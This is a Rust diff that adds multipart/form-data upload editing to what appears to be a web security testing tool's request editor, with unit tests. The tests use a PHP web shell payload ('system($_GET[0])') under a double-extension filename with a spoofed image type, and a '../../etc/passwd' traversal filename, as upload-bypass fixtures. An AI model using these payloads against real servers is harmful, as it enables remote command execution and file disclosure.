@@ -62,8 +62,28 @@ pub enum Target {
     Json(String),
     /// One field of a form-encoded body.
     Form(String),
+    /// One part of a `multipart/form-data` body, and which of its three
+    /// interesting pieces.
+    Multipart { field: String, piece: Piece },
     /// The whole body.
     BodyRaw,
+}
+
+/// Which part of a multipart part an edit names.
+///
+/// Three, because a file upload has three separately-checked things in it and a
+/// filter usually reads a different one from the one that decides where the
+/// bytes land: the name the server stores it under, the type it claims to be,
+/// and the content itself.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "kebab-case")]
+pub enum Piece {
+    /// The bytes.
+    Data,
+    /// The declared filename. Where a traversal or a double extension goes.
+    Filename,
+    /// The declared `Content-Type`. What a type filter reads.
+    ContentType,
 }
 
 impl fmt::Display for Target {
@@ -77,6 +97,11 @@ impl fmt::Display for Target {
             Target::Cookie(name) => write!(f, "cookie.{name}"),
             Target::Json(path) => write!(f, "json.{path}"),
             Target::Form(name) => write!(f, "form.{name}"),
+            Target::Multipart { field, piece } => match piece {
+                Piece::Data => write!(f, "multipart.{field}"),
+                Piece::Filename => write!(f, "multipart.{field}.filename"),
+                Piece::ContentType => write!(f, "multipart.{field}.content_type"),
+            },
             Target::BodyRaw => write!(f, "body.raw"),
         }
     }
@@ -247,11 +272,25 @@ fn parse_target(spec: &str) -> Result<Target, EditError> {
                 spec,
                 "the only body target is `body.raw`; to change one field use `json.` or `form.`",
             )),
-            "multipart" => Err(EditError::new(
-                spec,
-                "multipart editing is not built yet: send the whole body with `body.raw` \
-                 and set `header.Content-Type` to match",
-            )),
+            "multipart" => {
+                // `multipart.avatar`, `multipart.avatar.filename`,
+                // `multipart.avatar.content_type`. The field name comes first
+                // because that is how a person says it out loud.
+                let (field, piece) = match name.rsplit_once('.') {
+                    Some((field, "filename")) => (field, Piece::Filename),
+                    Some((field, "content_type")) | Some((field, "content-type")) => {
+                        (field, Piece::ContentType)
+                    }
+                    _ => (name, Piece::Data),
+                };
+                if field.is_empty() {
+                    return Err(EditError::new(spec, "names a piece but not which field"));
+                }
+                Ok(Target::Multipart {
+                    field: field.to_string(),
+                    piece,
+                })
+            }
             other => Err(EditError::new(
                 spec,
                 format!(
@@ -535,6 +574,105 @@ fn apply_one(request: &mut Editable, edit: &Edit, create: bool) -> Result<Applie
             })
         }
 
+        Target::Multipart { field, piece } => {
+            let declared = request.content_type().unwrap_or("").to_string();
+            let mut parts = match crate::multipart::boundary_of(&declared) {
+                // Already multipart: take it apart, or say it is not the shape
+                // it claims rather than quietly replacing it.
+                Some(boundary) => crate::multipart::parse(&request.body, &boundary)
+                    .ok_or_else(|| {
+                        EditError::new(
+                            &target,
+                            "this request says it is multipart and its body does not match \
+                             the boundary it declares, so there is nothing to edit safely",
+                        )
+                    })?,
+                None if request.body.is_empty() || create => {
+                    // Not multipart yet. With `--set-create` this *builds* an
+                    // upload, which is the common case: a file-upload test
+                    // usually has no recorded upload to start from, because the
+                    // engine does not post files itself.
+                    Vec::new()
+                }
+                None => {
+                    return Err(EditError::new(
+                        &target,
+                        format!(
+                            "this request's body is not multipart; its Content-Type is {}. \
+                             Pass --set-create to build a multipart body instead",
+                            if declared.is_empty() { "unset" } else { &declared }
+                        ),
+                    ));
+                }
+            };
+
+            let at = parts.iter().position(|part| &part.name == field);
+            let was = at.and_then(|at| match piece {
+                Piece::Data => Some(String::from_utf8_lossy(&parts[at].data).into_owned()),
+                Piece::Filename => parts[at].filename.clone(),
+                Piece::ContentType => parts[at].content_type.clone(),
+            });
+            if at.is_none() && !create && !removing {
+                let names: Vec<&str> = parts.iter().map(|p| p.name.as_str()).collect();
+                return Err(EditError::new(
+                    &target,
+                    format!(
+                        "no such part, so nothing would change. This request has: {}. \
+                         Pass --set-create to add it",
+                        if names.is_empty() {
+                            "none".to_string()
+                        } else {
+                            names.join(", ")
+                        }
+                    ),
+                ));
+            }
+
+            if removing {
+                if let Some(at) = at {
+                    match piece {
+                        Piece::Data => {
+                            parts.remove(at);
+                        }
+                        Piece::Filename => parts[at].filename = None,
+                        Piece::ContentType => parts[at].content_type = None,
+                    }
+                }
+            } else {
+                let at = match at {
+                    Some(at) => at,
+                    None => {
+                        parts.push(crate::multipart::Part {
+                            name: field.clone(),
+                            ..Default::default()
+                        });
+                        parts.len() - 1
+                    }
+                };
+                match piece {
+                    Piece::Data => parts[at].data = value.clone(),
+                    Piece::Filename => parts[at].filename = Some(text(&value)),
+                    Piece::ContentType => parts[at].content_type = Some(text(&value)),
+                }
+            }
+
+            // The engine's own boundary, always. Re-using the one that arrived
+            // means a caller who puts that string in a part's data splits the
+            // message, and sends something other than what was asked for.
+            let boundary = crate::multipart::fresh_boundary();
+            request.body = crate::multipart::serialize(&parts, &boundary);
+            request.set_header(
+                "Content-Type",
+                &format!("multipart/form-data; boundary={boundary}"),
+            );
+            Ok(Applied {
+                target,
+                value: (!removing).then(|| text(&value)),
+                created: was.is_none() && !removing,
+                was,
+            })
+        }
+
         Target::BodyRaw => {
             let was = request.body.len();
             request.body = value.clone();
@@ -780,6 +918,127 @@ mod tests {
         assert_eq!(pairs[1].1, "hunter2");
     }
 
+    /// The file-upload test, built from nothing: the engine never posts a file
+    /// itself, so there is usually no recorded upload to start from.
+    #[test]
+    fn an_upload_can_be_built_where_there_was_no_body() {
+        let mut request = Editable {
+            method: "POST".to_string(),
+            url: Url::parse("https://app.test/upload").unwrap(),
+            headers: Vec::new(),
+            body: Vec::new(),
+        };
+        apply(
+            &mut request,
+            &[
+                set("multipart.file=<?php system($_GET[0]); ?>"),
+                set("multipart.file.filename=shell.php.png"),
+                set("multipart.file.content_type=image/png"),
+            ],
+            true,
+        )
+        .expect("builds");
+
+        let kind = request.content_type().expect("a content type was set");
+        let boundary = crate::multipart::boundary_of(kind).expect("with a boundary");
+        let parts = crate::multipart::parse(&request.body, &boundary).expect("well formed");
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0].name, "file");
+        assert_eq!(parts[0].filename.as_deref(), Some("shell.php.png"));
+        assert_eq!(parts[0].content_type.as_deref(), Some("image/png"));
+        assert_eq!(parts[0].data, b"<?php system($_GET[0]); ?>");
+    }
+
+    /// The three pieces are edited apart, because a server checks them apart.
+    #[test]
+    fn one_piece_of_an_upload_changes_and_the_rest_stays() {
+        let boundary = "----abc";
+        let original = crate::multipart::serialize(
+            &[
+                crate::multipart::Part {
+                    name: "csrf".to_string(),
+                    data: b"tok_1".to_vec(),
+                    ..Default::default()
+                },
+                crate::multipart::Part {
+                    name: "avatar".to_string(),
+                    filename: Some("cat.png".to_string()),
+                    content_type: Some("image/png".to_string()),
+                    data: b"\x89PNG data".to_vec(),
+                    ..Default::default()
+                },
+            ],
+            boundary,
+        );
+        let mut request = Editable {
+            method: "POST".to_string(),
+            url: Url::parse("https://app.test/upload").unwrap(),
+            headers: vec![(
+                "Content-Type".to_string(),
+                format!("multipart/form-data; boundary={boundary}"),
+            )],
+            body: original,
+        };
+
+        let applied = apply(
+            &mut request,
+            &[set("multipart.avatar.filename=../../etc/passwd")],
+            false,
+        )
+        .expect("applies");
+        assert_eq!(applied[0].was.as_deref(), Some("cat.png"));
+
+        let kind = request.content_type().unwrap().to_string();
+        let boundary = crate::multipart::boundary_of(&kind).unwrap();
+        let parts = crate::multipart::parse(&request.body, &boundary).unwrap();
+        assert_eq!(parts[0].data, b"tok_1", "the other field is untouched");
+        assert_eq!(parts[1].filename.as_deref(), Some("../../etc/passwd"));
+        assert_eq!(parts[1].content_type.as_deref(), Some("image/png"));
+        assert_eq!(parts[1].data, b"\x89PNG data", "the file itself is untouched");
+    }
+
+    /// `.name` is not `.filename`, and the difference has to be visible.
+    #[test]
+    fn a_near_miss_on_a_piece_name_is_caught_by_the_create_rule() {
+        let boundary = "----abc";
+        let mut request = Editable {
+            method: "POST".to_string(),
+            url: Url::parse("https://app.test/upload").unwrap(),
+            headers: vec![(
+                "Content-Type".to_string(),
+                format!("multipart/form-data; boundary={boundary}"),
+            )],
+            body: crate::multipart::serialize(
+                &[crate::multipart::Part {
+                    name: "file".to_string(),
+                    filename: Some("cat.png".to_string()),
+                    data: b"data".to_vec(),
+                    ..Default::default()
+                }],
+                boundary,
+            ),
+        };
+        let error = apply(&mut request, &[set("multipart.file.name=shell.php")], false)
+            .expect_err("refused");
+        assert!(
+            error.message.contains("This request has: file"),
+            "the error names the part that does exist: {}",
+            error.message
+        );
+    }
+
+    #[test]
+    fn a_multipart_edit_on_a_body_that_is_not_one_says_so() {
+        let mut request = Editable {
+            method: "POST".to_string(),
+            url: Url::parse("https://app.test/upload").unwrap(),
+            headers: vec![("Content-Type".to_string(), "application/json".to_string())],
+            body: b"{}".to_vec(),
+        };
+        let error = apply(&mut request, &[set("multipart.file=x")], false).expect_err("refused");
+        assert!(error.message.contains("application/json"), "{}", error.message);
+    }
+
     #[test]
     fn a_framing_header_is_refused_here_too() {
         let mut request = request();
@@ -798,8 +1057,18 @@ mod tests {
     fn an_unknown_target_says_what_the_targets_are() {
         let error = parse_set("headers.X=1").expect_err("refused");
         assert!(error.message.contains("header."), "{}", error.message);
-        let error = parse_set("multipart.file.name=x").expect_err("refused");
-        assert!(error.message.contains("not built yet"), "{}", error.message);
+        // `multipart.<field>` where the field itself contains a dot is legal, so
+        // only `filename` and `content_type` are read as pieces. A near miss
+        // like `.name` is a field name, and the create rule is what catches it:
+        // see `a_near_miss_on_a_piece_name_is_caught_by_the_create_rule`.
+        let edit = parse_set("multipart.file.name=x").expect("parses as a field");
+        assert_eq!(
+            edit.target,
+            Target::Multipart {
+                field: "file.name".to_string(),
+                piece: Piece::Data
+            }
+        );
     }
 
     #[test]
